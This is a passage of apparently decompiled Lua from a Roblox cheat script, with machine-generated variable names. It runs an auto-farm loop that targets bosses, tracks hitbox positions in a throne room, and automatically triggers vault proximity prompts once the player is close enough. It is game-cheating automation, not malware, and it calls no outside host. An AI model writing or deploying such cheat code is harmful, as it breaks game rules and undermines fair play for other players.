                    is_a_4 = nil
                end
                value_object = "ValueObject"
                is_a_4 = is_a_4(health, value_object)
                if not is_a_4 then
                    if find_first_child_10 ~= nil then
                        is_a_4 = find_first_child_10.ClassName
                    else
                        is_a_4 = nil
                    end
                    health = is_a_4
                    if is_a_4 then
                        is_a_4 = is_a_4.find
                    else
                        is_a_4 = nil
                    end
                    value_object = "Value"
                    is_a_4 = is_a_4(health, value_object)
                    if is_a_4 then
                        if find_first_child_10 ~= nil then
                            value_17 = find_first_child_10.Value
                        else
                            value_17 = nil
                        end
                    else
                        health = find_first_child_10
                        if find_first_child_10 then
                            is_a_4 = find_first_child_10.IsA
                        else
                            is_a_4 = nil
                        end
                        value_object = "Humanoid"
                        is_a_4 = is_a_4(health, value_object)
                        if is_a_4 then
                            if find_first_child_10 ~= nil then
                                value_17 = find_first_child_10.Health
                            else
                                value_17 = nil
                            end
                        else
                            is_a_4 = pcall
                            local val_167 = find_first_child_10
                            health = function()
                                local value_18 = val_167
                                if value_18 ~= nil then
                                    value_18 = value_18.Value
                                else
                                    value_18 = nil
                                end
                                return value_18
                            end
                            is_a_4 = is_a_4(health)
                            if is_a_4 then
                                if health then
                                    value_17 = health
                                end
                            end
                        end
                    end
                else
                    if find_first_child_10 ~= nil then
                        value_17 = find_first_child_10.Value
                    else
                        value_17 = nil
                    end
                end
            else
                health = argument_1
                if argument_1 then
                    is_a_4 = argument_1.FindFirstChildOfClass
                else
                    is_a_4 = nil
                end
                value_object = "Humanoid"
                is_a_4 = is_a_4(health, value_object)
                if is_a_4 then
                    if is_a_4 ~= nil then
                        value_17 = is_a_4.Health
                    else
                        value_17 = nil
                    end
                end
            end
            return value_17
        end
    end
    tbl_35.value = task
    if tbl_35.value ~= nil then
        tbl_35.value = tbl_35.value.spawn
    else
        tbl_35.value = nil
    end
    do
        local val_168, capture_1_156162, capture_1_156163, capture_1_156164, capture_1_156165, val_169, val_170, capture_1_156168, capture_1_156169, capture_1_156170, capture_1_156171, val_171, capture_1_156173, capture_1_156174, val_172, capture_1_156176, val_173, val_174, val_175, val_176, capture_1_156181, val_177 = tbl_3, tbl_10, tbl_11, tbl_26, tbl_25, workspace_2, pcall_2, tbl_32, tbl_27, tbl_28, tbl_30, handler_13, tbl_34, tbl_29, make_tab, tbl_31, tbl_12, tbl_9, handler_6, handler_result, tbl_23, handler_5
        handler_14 = function()
            local pack_result_67
            local auto_farm, value_19, in_cutscene_2, find_first_child_11, val_178, atticus, health_2, humanoid_2, health_3, humanoid_3, aura_radius, vault, throne_room, workspace_7, val_179, korth, health_4, humanoid_4, korth_result, ipairs_3, name_2, get_pivot_2, basehitbox, ipairs_4, name_3, get_pivot_3, ipairs_4_result, val_180, magnitude, val_181
            while true do
                (task.wait)()
                auto_farm = val_168
                if auto_farm ~= nil then
                    auto_farm = auto_farm.AutoFarm
                else
                    auto_farm = nil
                end
                if auto_farm then
                    auto_farm = capture_1_156162.value
                    if auto_farm then
                        auto_farm = capture_1_156163.value
                        if auto_farm then
                            auto_farm = workspace
                            value_19 = auto_farm
                            auto_farm = auto_farm.FindFirstChild
                            in_cutscene_2 = "inCutscene"
                            auto_farm = auto_farm(value_19, in_cutscene_2)
                            if auto_farm then
                                if auto_farm ~= nil then
                                    value_19 = auto_farm.Value
                                else
                                    value_19 = nil
                                end
                                if value_19 then
                                    value_19 = capture_1_156162.value
                                    in_cutscene_2 = value_19
                                    if value_19 then
                                        value_19 = value_19.FindFirstChild
                                    else
                                        value_19 = nil
                                    end
                                    find_first_child_11 = "BV"
                                    value_19 = value_19(in_cutscene_2, find_first_child_11)
                                    if value_19 then
                                        value_19 = capture_1_156162.value
                                        if value_19 ~= nil then
                                            value_19 = value_19.BV
                                        else
                                            value_19 = nil
                                        end
                                        in_cutscene_2 = Vector3.zero
                                        if value_19 then
                                            value_19.Velocity = in_cutscene_2
                                        end
                                    end
                                else
                                    value_19 = (capture_1_156164.value)()
                                    if in_cutscene_2 then
                                        capture_1_156165.value = in_cutscene_2
                                    end
                                    find_first_child_11 = val_169
                                    val_178 = find_first_child_11
                                    if find_first_child_11 then
                                        find_first_child_11 = find_first_child_11.FindFirstChild
                                    else
                                        find_first_child_11 = nil
                                    end
                                    atticus = "Atticus"
                                    find_first_child_11 = find_first_child_11(val_178, atticus)
                                    val_178 = false
                                    if find_first_child_11 then
                                        health_2 = find_first_child_11
                                        if find_first_child_11 then
                                            atticus = find_first_child_11.FindFirstChild
                                        else
                                            atticus = nil
                                        end
                                        humanoid_2 = "Humanoid"
                                        atticus = atticus(health_2, humanoid_2)
                                        if atticus then
                                            if atticus ~= nil then
                                                health_2 = atticus.Health
                                            else
                                                health_2 = nil
                                            end
                                            if (0.0 < health_2) then
                                                humanoid_2 = atticus
                                                if atticus then
                                                    health_2 = atticus.GetState
                                                else
                                                    health_2 = nil
                                                end
                                                health_2 = health_2(humanoid_2)
                                                humanoid_2 = Enum.HumanoidStateType
                                                if humanoid_2 ~= nil then
                                                    humanoid_2 = humanoid_2.Dead
                                                else
                                                    humanoid_2 = nil
                                                end
                                                if health_2 ~= humanoid_2 then
                                                    val_178 = true
                                                end
                                            end
                                        end
                                    end
                                    atticus = val_170()
                                    if (atticus == "AncientSands") then
                                        if val_178 then
                                            atticus = type
                                            health_2 = capture_1_156165.value
                                            atticus = atticus(health_2)
                                            if (atticus == "number") then
                                                atticus = capture_1_156165.value
                                                if (20.0 <= atticus) then
                                                    atticus = 20.0
                                                    capture_1_156165.value = atticus
                                                end
                                            end
                                        end
                                    end
                                    atticus = val_169
                                    health_2 = atticus
                                    if atticus then
                                        atticus = atticus.FindFirstChild
                                    else
                                        atticus = nil
                                    end
                                    humanoid_2 = "AkumaBossFight"
                                    atticus = atticus(health_2, humanoid_2)
                                    health_2 = false
                                    if atticus then
                                        health_3 = atticus
                                        if atticus then
                                            humanoid_2 = atticus.FindFirstChild
                                        else
                                            humanoid_2 = nil
                                        end
                                        humanoid_3 = "Humanoid"
                                        humanoid_2 = humanoid_2(health_3, humanoid_3)
                                        if humanoid_2 then
                                            if humanoid_2 ~= nil then
                                                health_3 = humanoid_2.Health
                                            else
                                                health_3 = nil
                                            end
                                            if (0.0 < health_3) then
                                                humanoid_3 = humanoid_2
                                                if humanoid_2 then
                                                    health_3 = humanoid_2.GetState
                                                else
                                                    health_3 = nil
                                                end
                                                health_3 = health_3(humanoid_3)
                                                humanoid_3 = Enum.HumanoidStateType
                                                if humanoid_3 ~= nil then
                                                    humanoid_3 = humanoid_3.Dead
                                                else
                                                    humanoid_3 = nil
                                                end
                                                if health_3 ~= humanoid_3 then
                                                    health_2 = true
                                                end
                                            end
                                        end
                                    end
                                    humanoid_2 = val_170()
                                    if (humanoid_2 == "HauntedTundra") then
                                        if health_2 then
                                            humanoid_2 = type
                                            health_3 = capture_1_156165.value
                                            humanoid_2 = humanoid_2(health_3)
                                            if (humanoid_2 == "number") then
                                                humanoid_2 = capture_1_156165.value
                                                if (11.0 <= humanoid_2) then
                                                    humanoid_2 = 11.0
                                                    capture_1_156165.value = humanoid_2
                                                end
                                            end
                                        end
                                    end
                                    humanoid_2 = (capture_1_156168.value)()
                                    if (humanoid_2 == nil) then
                                        health_3 = false
                                    else
                                        health_3 = true
                                    end
                                    humanoid_3 = val_170()
                                    if (humanoid_3 == "HauntedTundra") then
                                        if health_3 then
                                            humanoid_3 = type
                                            aura_radius = capture_1_156165.value
                                            humanoid_3 = humanoid_3(aura_radius)
                                            if (humanoid_3 == "number") then
                                                humanoid_3 = capture_1_156165.value
                                                if (17.0 <= humanoid_3) then
                                                    humanoid_3 = 17.0
                                                    capture_1_156165.value = humanoid_3
                                                end
                                            end
                                        end
                                    end
                                    humanoid_3 = capture_1_156165.value
                                    if humanoid_3 ~= 20.0 then
                                        capture_1_156169.value = false
                                        humanoid_3 = false
                                        capture_1_156170.value = humanoid_3
                                    end
                                    humanoid_3 = val_170()
                                    if (humanoid_3 == "HauntedTundra") then
                                        humanoid_3 = health_2
                                    else
                                        humanoid_3 = false
                                    end
                                    if humanoid_3 then
                                        aura_radius = capture_1_156171.value
                                        if not aura_radius then
                                            aura_radius = val_168
                                            if aura_radius ~= nil then
                                                aura_radius = aura_radius.AuraRadius
                                            else
                                                aura_radius = nil
                                            end
                                            capture_1_156171.value = aura_radius
                                        end
                                        aura_radius = val_168
                                        if aura_radius then
                                            aura_radius.AuraRadius = 30.0
                                        end
                                    else
                                        aura_radius = capture_1_156171.value
                                        if aura_radius then
                                            aura_radius = val_168
                                            vault = capture_1_156171.value
                                            if aura_radius then
                                                aura_radius.AuraRadius = vault
                                            end
                                            aura_radius = nil
                                            capture_1_156171.value = aura_radius
                                        end
                                    end
                                    aura_radius = val_170()
                                    if (aura_radius == "AncientSands") then
                                        aura_radius = capture_1_156165.value
                                        if aura_radius ~= 20.0 then
                                            aura_radius = false
                                        else
                                            aura_radius = true
                                        end
                                    else
                                        aura_radius = false
                                    end
                                    vault = workspace:FindFirstChild("Vault")
                                    vaultTarget = nil
                                    throne_room = workspace:FindFirstChild("ThroneRoom")
                                    workspace_7 = workspace
                                    val_179 = workspace_7
                                    workspace_7 = workspace_7.FindFirstChild
                                    korth = "Korth"
                                    workspace_7 = workspace_7(val_179, korth)
                                    val_179 = false
                                    if workspace_7 then
                                        health_4 = workspace_7
                                        if workspace_7 then
                                            korth = workspace_7.FindFirstChild
                                        else
                                            korth = nil
                                        end
                                        humanoid_4 = "Humanoid"
                                        korth = korth(health_4, humanoid_4)
                                        if korth then
                                            if korth ~= nil then
                                                health_4 = korth.Health
                                            else
                                                health_4 = nil
                                            end
                                            if (0.0 < health_4) then
                                                humanoid_4 = korth
                                                if korth then
                                                    health_4 = korth.GetState
                                                else
                                                    health_4 = nil
                                                end
                                                health_4 = health_4(humanoid_4)
                                                humanoid_4 = Enum.HumanoidStateType
                                                if humanoid_4 ~= nil then
                                                    humanoid_4 = humanoid_4.Dead
                                                else
                                                    humanoid_4 = nil
                                                end
                                                if health_4 ~= humanoid_4 then
                                                    val_179 = true
                                                end
                                            end
                                        end
                                    end
                                    if throne_room then
                                        korth = #thronePositions
                                        if (korth < 2.0) then
                                            korth = ipairs
                                            humanoid_4 = throne_room
                                            if throne_room then
                                                health_4 = throne_room.GetChildren
                                            else
                                                health_4 = nil
                                            end
                                            pack_result_67 = pack(health_4(humanoid_4))
                                            if pack_result_67.n >= 1 then
                                                health_4 = pack_result_67[1]
                                            end
                                            if pack_result_67.n >= 2 then
                                                humanoid_4 = pack_result_67[2]
                                            end
                                            if pack_result_67.n >= 3 then
                                                korth_result = pack_result_67[3]
                                            end
                                            if pack_result_67.n >= 4 then
                                                ipairs_3 = pack_result_67[4]
                                            end
                                            if pack_result_67.n >= 5 then
                                                name_2 = pack_result_67[5]
                                            end
                                            if pack_result_67.n >= 6 then
                                                get_pivot_2 = pack_result_67[6]
                                            end
                                            if pack_result_67.n >= 7 then
                                                basehitbox = pack_result_67[7]
                                            end
                                            if pack_result_67.n >= 8 then
                                                ipairs_4 = pack_result_67[8]
                                            end
                                            if pack_result_67.n >= 9 then
                                                name_3 = pack_result_67[9]
                                            end
                                            if pack_result_67.n >= 10 then
                                                get_pivot_3 = pack_result_67[10]
                                            end
                                            if pack_result_67.n >= 11 then
                                                ipairs_4_result = pack_result_67[11]
                                            end
                                            if pack_result_67.n >= 12 then
                                                val_180 = pack_result_67[12]
                                            end
                                            if pack_result_67.n >= 13 then
                                                magnitude = pack_result_67[13]
                                            end
                                            if pack_result_67.n >= 14 then
                                                val_181 = pack_result_67[14]
                                            end
                                            korth = korth(unpack(pack_result_67, 1, pack_result_67.n))
                                            while true do
                                                korth_result = korth(health_4, humanoid_4)
                                                if korth_result ~= nil then
                                                    humanoid_4 = korth_result
                                                    if ipairs_3 ~= nil then
                                                        name_2 = ipairs_3.Name
                                                    else
                                                        name_2 = nil
                                                    end
                                                    if (name_2 == "BookHand") then
                                                        get_pivot_2 = ipairs_3
                                                        if ipairs_3 then
                                                            name_2 = ipairs_3.FindFirstChild
                                                        else
                                                            name_2 = nil
                                                        end
                                                        basehitbox = "basehitbox"
                                                        name_2 = name_2(get_pivot_2, basehitbox)
                                                        if name_2 then
                                                            basehitbox = name_2
                                                            if name_2 then
                                                                get_pivot_2 = name_2.GetPivot
                                                            else
                                                                get_pivot_2 = nil
                                                            end
                                                            get_pivot_2 = get_pivot_2(basehitbox)
                                                            if get_pivot_2 ~= nil then
                                                                get_pivot_2 = get_pivot_2.Position
                                                            else
                                                                get_pivot_2 = nil
                                                            end
                                                            basehitbox = false
                                                            ipairs_4 = ipairs
                                                            name_3 = thronePositions
                                                            ipairs_4 = ipairs_4(name_3)
                                                            while true do
                                                                ipairs_4_result = ipairs_4(name_3, get_pivot_3)
                                                                if ipairs_4_result ~= nil then
                                                                    get_pivot_3 = ipairs_4_result
                                                                    magnitude = (val_180) - (get_pivot_2)
                                                                    if magnitude ~= nil then
                                                                        magnitude = magnitude.Magnitude
                                                                    else
                                                                        magnitude = nil
                                                                    end
                                                                    if (magnitude < 5.0) then
                                                                        basehitbox = true
                                                                        break
                                                                    end
                                                                else
                                                                    break
                                                                end
                                                            end
                                                            if not basehitbox then
                                                                ipairs_4 = table
                                                                if ipairs_4 ~= nil then
                                                                    ipairs_4 = ipairs_4.insert
                                                                else
                                                                    ipairs_4 = nil
                                                                end
                                                                name_3 = thronePositions
                                                                get_pivot_3 = get_pivot_2
                                                                ipairs_4(name_3, get_pivot_3)
                                                            end
                                                        end
                                                    end
                                                else
                                                    break
                                                end
                                            end
                                        end
                                        korth = false
                                        health_4 = false
                                        humanoid_4 = nil
                                        korth_result = nil
                                        ipairs_3 = ipairs
                                        get_pivot_2 = throne_room
                                        if throne_room then
                                            name_2 = throne_room.GetChildren
                                        else
                                            name_2 = nil
                                        end
                                        pack_result_67 = pack(name_2(get_pivot_2))
                                        if pack_result_67.n >= 1 then
                                            name_2 = pack_result_67[1]
                                        end
                                        if pack_result_67.n >= 2 then
                                            get_pivot_2 = pack_result_67[2]
                                        end
                                        if pack_result_67.n >= 3 then
                                            basehitbox = pack_result_67[3]
                                        end
                                        if pack_result_67.n >= 4 then
                                            ipairs_4 = pack_result_67[4]
                                        end
                                        if pack_result_67.n >= 5 then
                                            name_3 = pack_result_67[5]
                                        end
                                        if pack_result_67.n >= 6 then
                                            get_pivot_3 = pack_result_67[6]
                                        end
                                        if pack_result_67.n >= 7 then
                                            ipairs_4_result = pack_result_67[7]
                                        end
                                        if pack_result_67.n >= 8 then
                                            val_180 = pack_result_67[8]
                                        end
                                        if pack_result_67.n >= 9 then
                                            magnitude = pack_result_67[9]
                                        end
                                        if pack_result_67.n >= 10 then
                                            val_181 = pack_result_67[10]
                                        end
                                        ipairs_3 = ipairs_3(unpack(pack_result_67, 1, pack_result_67.n))
                                        while true do
                                            basehitbox = ipairs_3(name_2, get_pivot_2)
                                            if basehitbox ~= nil then
                                                get_pivot_2 = basehitbox
                                                if ipairs_4 ~= nil then
                                                    name_3 = ipairs_4.Name
                                                else
                                                    name_3 = nil
                                                end
                                                if (name_3 == "BookHand") then
                                                    get_pivot_3 = ipairs_4
                                                    if ipairs_4 then
                                                        name_3 = ipairs_4.FindFirstChild
                                                    else
                                                        name_3 = nil
                                                    end
                                                    ipairs_4_result = "basehitbox"
                                                    name_3 = name_3(get_pivot_3, ipairs_4_result)
                                                    if name_3 then
                                                        ipairs_4_result = name_3
                                                        if name_3 then
                                                            get_pivot_3 = name_3.GetPivot
                                                        else
                                                            get_pivot_3 = nil
                                                        end
                                                        get_pivot_3 = get_pivot_3(ipairs_4_result)
                                                        if get_pivot_3 ~= nil then
                                                            get_pivot_3 = get_pivot_3.Position
                                                        else
                                                            get_pivot_3 = nil
                                                        end
                                                        ipairs_4_result = #thronePositions
                                                        if (1.0 <= ipairs_4_result) then
                                                            ipairs_4_result = thronePositions
                                                            if ipairs_4_result ~= nil then
                                                                ipairs_4_result = ipairs_4_result[1.0]
                                                            else
                                                                ipairs_4_result = nil
                                                            end
                                                            ipairs_4_result = (ipairs_4_result) - (get_pivot_3)
                                                            if ipairs_4_result ~= nil then
                                                                ipairs_4_result = ipairs_4_result.Magnitude
                                                            else
                                                                ipairs_4_result = nil
                                                            end
                                                            if (ipairs_4_result < 5.0) then
                                                                humanoid_4 = ipairs_4
                                                                ipairs_4_result = val_171
                                                                val_180 = ipairs_4
                                                                ipairs_4_result = ipairs_4_result(val_180)
                                                                if (0.0 < ipairs_4_result) then
                                                                    korth = true
                                                                end
                                                            else
                                                                ipairs_4_result = #thronePositions
                                                                if (2.0 <= ipairs_4_result) then
                                                                    ipairs_4_result = thronePositions
                                                                    if ipairs_4_result ~= nil then
                                                                        ipairs_4_result = ipairs_4_result[2.0]
                                                                    else
                                                                        ipairs_4_result = nil
                                                                    end
                                                                    ipairs_4_result = (ipairs_4_result) - (get_pivot_3)
                                                                    if ipairs_4_result ~= nil then
                                                                        ipairs_4_result = ipairs_4_result.Magnitude
                                                                    else
                                                                        ipairs_4_result = nil
                                                                    end
                                                                    if (ipairs_4_result < 5.0) then
                                                                        korth_result = ipairs_4
                                                                        ipairs_4_result = val_171
                                                                        val_180 = ipairs_4
                                                                        ipairs_4_result = ipairs_4_result(val_180)
                                                                        if (0.0 < ipairs_4_result) then
                                                                            health_4 = true
                                                                        end
                                                                    end
                                                                end
                                                            end
                                                        else
                                                            ipairs_4_result = #thronePositions
                                                            if (2.0 <= ipairs_4_result) then
                                                                ipairs_4_result = thronePositions
                                                                if ipairs_4_result ~= nil then
                                                                    ipairs_4_result = ipairs_4_result[2.0]
                                                                else
                                                                    ipairs_4_result = nil
                                                                end
                                                                ipairs_4_result = (ipairs_4_result) - (get_pivot_3)
                                                                if ipairs_4_result ~= nil then
                                                                    ipairs_4_result = ipairs_4_result.Magnitude
                                                                else
                                                                    ipairs_4_result = nil
                                                                end
                                                                if (ipairs_4_result < 5.0) then
                                                                    korth_result = ipairs_4
                                                                    ipairs_4_result = val_171
                                                                    val_180 = ipairs_4
                                                                    ipairs_4_result = ipairs_4_result(val_180)
                                                                    if (0.0 < ipairs_4_result) then
                                                                        health_4 = true
                                                                    end
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            else
                                                break
                                            end
                                        end
                                        if not korth then
                                            if health_4 then
                                                ipairs_3 = currentThroneHandIndex
                                                if not ipairs_3 then
                                                    if korth then
                                                        ipairs_3 = 1.0
                                                        if not ipairs_3 then
                                                            ipairs_3 = 2.0
                                                        end
                                                    else
                                                        ipairs_3 = 2.0
                                                    end
                                                    currentThroneHandIndex = ipairs_3
                                                end
                                                if val_179 then
                                                    if workspace_7 then
                                                        ipairs_3 = tick()
                                                        name_2 = capture_1_156173.value
                                                        ipairs_3 = (ipairs_3) - (name_2)
                                                        if (3.0 < ipairs_3) then
                                                            if workspace_7 ~= nil then
                                                                ipairs_3 = workspace_7.HumanoidRootPart
                                                            else
                                                                ipairs_3 = nil
                                                            end
                                                            if ipairs_3 ~= nil then
                                                                ipairs_3 = ipairs_3.Position
                                                            else
                                                                ipairs_3 = nil
                                                            end
                                                            name_2 = capture_1_156162.value
                                                            if name_2 ~= nil then
                                                                name_2 = name_2.Position
                                                            else
                                                                name_2 = nil
                                                            end
                                                            name_2 = (name_2) - (ipairs_3)
                                                            if name_2 ~= nil then
                                                                name_2 = name_2.Magnitude
                                                            else
                                                                name_2 = nil
                                                            end
                                                            if (name_2 < 25.0) then
                                                                name_2 = currentThroneHandIndex
                                                                if (name_2 == 1.0) then
                                                                    name_2 = 2.0
                                                                    currentThroneHandIndex = name_2
                                                                else
                                                                    name_2 = 1.0
                                                                    currentThroneHandIndex = name_2
                                                                end
                                                                name_2 = tick()
                                                                capture_1_156173.value = name_2
                                                            end
                                                        end
                                                    end
                                                end
                                                ipairs_3 = currentThroneHandIndex
                                                if (ipairs_3 == 1.0) then
                                                    if korth then
                                                        ipairs_3 = korth
                                                    else
                                                        ipairs_3 = currentThroneHandIndex
                                                        if (ipairs_3 == 2.0) then
                                                            ipairs_3 = health_4
                                                        else
                                                            ipairs_3 = false
                                                        end
                                                    end
                                                else
                                                    ipairs_3 = currentThroneHandIndex
                                                    if (ipairs_3 == 2.0) then
                                                        ipairs_3 = health_4
                                                    else
                                                        ipairs_3 = false
                                                    end
                                                end
                                                if ipairs_3 then
                                                    name_2 = currentThroneHandIndex
                                                    if (name_2 == 1.0) then
                                                        if humanoid_4 then
                                                            name_2 = humanoid_4
                                                        else
                                                            name_2 = korth_result
                                                        end
                                                    else
                                                        name_2 = korth_result
                                                    end
                                                    basehitbox = name_2
                                                    if name_2 then
                                                        get_pivot_2 = name_2.FindFirstChild
                                                    else
                                                        get_pivot_2 = nil
                                                    end
                                                    ipairs_4 = "basehitbox"
                                                    vaultTarget = (get_pivot_2(basehitbox, ipairs_4))
                                                    get_pivot_2 = nil
                                                    throneFlightPos = get_pivot_2
                                                else
                                                    vaultTarget = nil
                                                    name_2 = #thronePositions
                                                    get_pivot_2 = currentThroneHandIndex
                                                    if (get_pivot_2 <= name_2) then
                                                        name_2 = thronePositions
                                                        get_pivot_2 = currentThroneHandIndex
                                                        if name_2 ~= nil then
                                                            name_2 = name_2[get_pivot_2]
                                                        else
                                                            name_2 = nil
                                                        end
                                                        if not name_2 then
                                                            name_2 = nil
                                                        end
                                                    else
                                                        name_2 = nil
                                                    end
                                                    throneFlightPos = name_2
                                                end
                                            else
                                                if val_179 then
                                                    vaultTarget = workspace_7
                                                    ipairs_3 = nil
                                                    throneFlightPos = ipairs_3
                                                end
                                            end
                                        else
                                            ipairs_3 = currentThroneHandIndex
                                            if not ipairs_3 then
                                                if korth then
                                                    ipairs_3 = 1.0
                                                    if not ipairs_3 then
                                                        ipairs_3 = 2.0
                                                    end
                                                else
                                                    ipairs_3 = 2.0
                                                end
                                                currentThroneHandIndex = ipairs_3
                                            end
                                            if val_179 then
                                                if workspace_7 then
                                                    ipairs_3 = tick()
                                                    name_2 = capture_1_156173.value
                                                    ipairs_3 = (ipairs_3) - (name_2)
                                                    if (3.0 < ipairs_3) then
                                                        if workspace_7 ~= nil then
                                                            ipairs_3 = workspace_7.HumanoidRootPart
                                                        else
                                                            ipairs_3 = nil
                                                        end
                                                        if ipairs_3 ~= nil then
                                                            ipairs_3 = ipairs_3.Position
                                                        else
                                                            ipairs_3 = nil
                                                        end
                                                        name_2 = capture_1_156162.value
                                                        if name_2 ~= nil then
                                                            name_2 = name_2.Position
                                                        else
                                                            name_2 = nil
                                                        end
                                                        name_2 = (name_2) - (ipairs_3)
                                                        if name_2 ~= nil then
                                                            name_2 = name_2.Magnitude
                                                        else
                                                            name_2 = nil
                                                        end
                                                        if (name_2 < 25.0) then
                                                            name_2 = currentThroneHandIndex
                                                            if (name_2 == 1.0) then
                                                                name_2 = 2.0
                                                                currentThroneHandIndex = name_2
                                                            else
                                                                name_2 = 1.0
                                                                currentThroneHandIndex = name_2
                                                            end
                                                            name_2 = tick()
                                                            capture_1_156173.value = name_2
                                                        end
                                                    end
                                                end
                                            end
                                            ipairs_3 = currentThroneHandIndex
                                            if (ipairs_3 == 1.0) then
                                                if korth then
                                                    ipairs_3 = korth
                                                else
                                                    ipairs_3 = currentThroneHandIndex
                                                    if (ipairs_3 == 2.0) then
                                                        ipairs_3 = health_4
                                                    else
                                                        ipairs_3 = false
                                                    end
                                                end
                                            else
                                                ipairs_3 = currentThroneHandIndex
                                                if (ipairs_3 == 2.0) then
                                                    ipairs_3 = health_4
                                                else
                                                    ipairs_3 = false
                                                end
                                            end
                                            if ipairs_3 then
                                                name_2 = currentThroneHandIndex
                                                if (name_2 == 1.0) then
                                                    if humanoid_4 then
                                                        name_2 = humanoid_4
                                                    else
                                                        name_2 = korth_result
                                                    end
                                                else
                                                    name_2 = korth_result
                                                end
                                                basehitbox = name_2
                                                if name_2 then
                                                    get_pivot_2 = name_2.FindFirstChild
                                                else
                                                    get_pivot_2 = nil
                                                end
                                                ipairs_4 = "basehitbox"
                                                vaultTarget = (get_pivot_2(basehitbox, ipairs_4))
                                                get_pivot_2 = nil
                                                throneFlightPos = get_pivot_2
                                            else
                                                vaultTarget = nil
                                                name_2 = #thronePositions
                                                get_pivot_2 = currentThroneHandIndex
                                                if (get_pivot_2 <= name_2) then
                                                    name_2 = thronePositions
                                                    get_pivot_2 = currentThroneHandIndex
                                                    if name_2 ~= nil then
                                                        name_2 = name_2[get_pivot_2]
                                                    else
                                                        name_2 = nil
                                                    end
                                                    if not name_2 then
                                                        name_2 = nil
                                                    end
                                                else
                                                    name_2 = nil
                                                end
                                                throneFlightPos = name_2
                                            end
                                        end
                                    else
                                        if aura_radius then
                                            if vault then
                                                health_4 = vault
                                                if vault then
                                                    korth = vault.FindFirstChild
                                                else
                                                    korth = nil
                                                end
                                                humanoid_4 = "Button1"
                                                korth = korth(health_4, humanoid_4)
                                                if korth then
                                                    if vault ~= nil then
                                                        korth = vault.Button1
                                                    else
                                                        korth = nil
                                                    end
                                                    health_4 = korth
                                                    if korth then
                                                        korth = korth.FindFirstChild
                                                    else
                                                        korth = nil
                                                    end
                                                    humanoid_4 = "ButtonPress"
                                                    korth = korth(health_4, humanoid_4)
                                                    if korth then
                                                        if vault ~= nil then
                                                            korth = vault.Button1
                                                        else
                                                            korth = nil
                                                        end
                                                        if korth ~= nil then
                                                            korth = korth.ButtonPress
                                                        else
                                                            korth = nil
                                                        end
                                                        health_4 = korth
                                                        if korth then
                                                            korth = korth.FindFirstChild
                                                        else
                                                            korth = nil
                                                        end
                                                        humanoid_4 = "ProximityPrompt"
                                                        korth = korth(health_4, humanoid_4)
                                                    end
                                                end
                                                humanoid_4 = vault
                                                if vault then
                                                    health_4 = vault.FindFirstChild
                                                else
                                                    health_4 = nil
                                                end
                                                korth_result = "Button2"
                                                health_4 = health_4(humanoid_4, korth_result)
                                                if health_4 then
                                                    if vault ~= nil then
                                                        health_4 = vault.Button2
                                                    else
                                                        health_4 = nil
                                                    end
                                                    humanoid_4 = health_4
                                                    if health_4 then
                                                        health_4 = health_4.FindFirstChild
                                                    else
                                                        health_4 = nil
                                                    end
                                                    korth_result = "ButtonPress"
                                                    health_4 = health_4(humanoid_4, korth_result)
                                                    if health_4 then
                                                        if vault ~= nil then
                                                            health_4 = vault.Button2
                                                        else
                                                            health_4 = nil
                                                        end
                                                        if health_4 ~= nil then
                                                            health_4 = health_4.ButtonPress
                                                        else
                                                            health_4 = nil
                                                        end
                                                        humanoid_4 = health_4
                                                        if health_4 then
                                                            health_4 = health_4.FindFirstChild
                                                        else
                                                            health_4 = nil
                                                        end
                                                        korth_result = "ProximityPrompt"
                                                        health_4 = health_4(humanoid_4, korth_result)
                                                    end
                                                end
                                                humanoid_4 = capture_1_156169.value
                                                if not humanoid_4 then
                                                    if korth then
                                                        if korth ~= nil then
                                                            humanoid_4 = korth.Enabled
                                                        else
                                                            humanoid_4 = nil
                                                        end
                                                        if humanoid_4 then
                                                            if vault ~= nil then
                                                                humanoid_4 = vault.Button1
                                                            else
                                                                humanoid_4 = nil
                                                            end
                                                            if humanoid_4 ~= nil then
                                                                humanoid_4 = humanoid_4.ButtonPress
                                                            else
                                                                humanoid_4 = nil
                                                            end
                                                            vaultTarget = humanoid_4
                                                            humanoid_4 = capture_1_156162.value
                                                            if humanoid_4 ~= nil then
                                                                humanoid_4 = humanoid_4.Position
                                                            else
                                                                humanoid_4 = nil
                                                            end
                                                            korth_result = vaultTarget
                                                            ipairs_3 = korth_result
                                                            if korth_result then
                                                                korth_result = korth_result.GetPivot
                                                            else
                                                                korth_result = nil
                                                            end
                                                            korth_result = korth_result(ipairs_3)
                                                            if korth_result ~= nil then
                                                                korth_result = korth_result.Position
                                                            else
                                                                korth_result = nil
                                                            end
                                                            humanoid_4 = (humanoid_4) - (korth_result)
                                                            if humanoid_4 ~= nil then
                                                                humanoid_4 = humanoid_4.Magnitude
                                                            else
                                                                humanoid_4 = nil
                                                            end
                                                            if (humanoid_4 <= 8.0) then
                                                                korth_result = capture_1_156174.value
                                                                ipairs_3 = korth
                                                                korth_result(ipairs_3)
                                                                korth_result = true
                                                                capture_1_156169.value = korth_result
                                                            end
                                                        else
                                                            humanoid_4 = true
                                                            capture_1_156169.value = humanoid_4
                                                        end
                                                    else
                                                        humanoid_4 = true
                                                        capture_1_156169.value = humanoid_4
                                                    end
                                                end
                                                humanoid_4 = capture_1_156169.value
                                                if humanoid_4 then
                                                    humanoid_4 = capture_1_156170.value
                                                    if not humanoid_4 then
                                                        if health_4 then
                                                            if health_4 ~= nil then
                                                                humanoid_4 = health_4.Enabled
                                                            else
                                                                humanoid_4 = nil
                                                            end
                                                            if humanoid_4 then
                                                                if vault ~= nil then
                                                                    humanoid_4 = vault.Button2
                                                                else
                                                                    humanoid_4 = nil
                                                                end
                                                                if humanoid_4 ~= nil then
                                                                    humanoid_4 = humanoid_4.ButtonPress
                                                                else
                                                                    humanoid_4 = nil
                                                                end
                                                                vaultTarget = humanoid_4
                                                                humanoid_4 = capture_1_156162.value
                                                                if humanoid_4 ~= nil then
                                                                    humanoid_4 = humanoid_4.Position
                                                                else
                                                                    humanoid_4 = nil
                                                                end
                                                                korth_result = vaultTarget
                                                                ipairs_3 = korth_result
                                                                if korth_result then
                                                                    korth_result = korth_result.GetPivot
                                                                else
                                                                    korth_result = nil
                                                                end
                                                                korth_result = korth_result(ipairs_3)
                                                                if korth_result ~= nil then
                                                                    korth_result = korth_result.Position
                                                                else
                                                                    korth_result = nil
                                                                end
                                                                humanoid_4 = (humanoid_4) - (korth_result)
                                                                if humanoid_4 ~= nil then
                                                                    humanoid_4 = humanoid_4.Magnitude
                                                                else
                                                                    humanoid_4 = nil
                                                                end
                                                                if (humanoid_4 <= 8.0) then
